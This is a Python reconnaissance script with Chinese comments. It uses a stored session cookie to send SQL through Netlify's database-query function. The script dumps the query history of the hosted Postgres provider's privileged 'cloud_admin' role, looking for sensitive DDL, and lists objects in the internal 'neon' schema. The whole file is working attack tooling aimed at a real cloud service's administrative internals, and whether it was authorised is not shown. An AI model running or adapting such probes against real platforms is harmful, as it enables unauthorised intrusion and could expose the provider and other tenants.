# -*- coding: utf-8 -*-
"""pg_stat_statements 全量 dump:cloud_admin 语句(78 条)找敏感 DDL
+ neon schema 对象侦察"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:3000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


print('== cloud_admin 全量语句 dump ==')
# 按 calls 排序太聚焦轮询;按 queryid 分页看全部,排除高频健康检查关键字
st, out = q("select dbid, queryid, left(query, 600) as q, calls from pg_stat_statements "
            "where userid::regrole::text='cloud_admin' and dbid=5 "
            "and not (query ilike '%pg_stat_activity%' or query ilike '%pg_stat_replication%' "
            "or query ilike '%pg_stat_subscription%' or query ilike '%pg_is_in_recovery%' "
            "or query ilike '%pg_current_wal_lsn%' or query ilike '%pg_stat_database%' "
            "or query ilike '%neon_lfc%' or query ilike '%neon_perf%' or query ilike '%pg_replication_slots%') "
            "order by calls desc limit 60")
print('[%d] %s' % (st, out[:3000]))
print()
print('== cloud_admin 在 dbid=1(template1)的语句 ==')
st, out = q("select dbid, left(query, 800) as q, calls from pg_stat_statements "
            "where userid::regrole::text='cloud_admin' and dbid=1")
print('[%d] %s' % (st, out[:2000]))
print()
print('== neon schema 对象 ==')
st, out = q("select c.relname, c.relkind from pg_class c join pg_namespace n on c.relnamespace=n.oid "
            "where n.nspname='neon' order by 2,1")
print('neon tables [%d] %s' % (st, out[:1200]))
st, out = q("select p.proname||'('||pg_get_function_identity_arguments(p.oid)||')' from pg_proc p "
            "join pg_namespace n on p.pronamespace=n.oid where n.nspname='neon' order by 1")
print('neon funcs [%d] %s' % (st, out[:1500]))
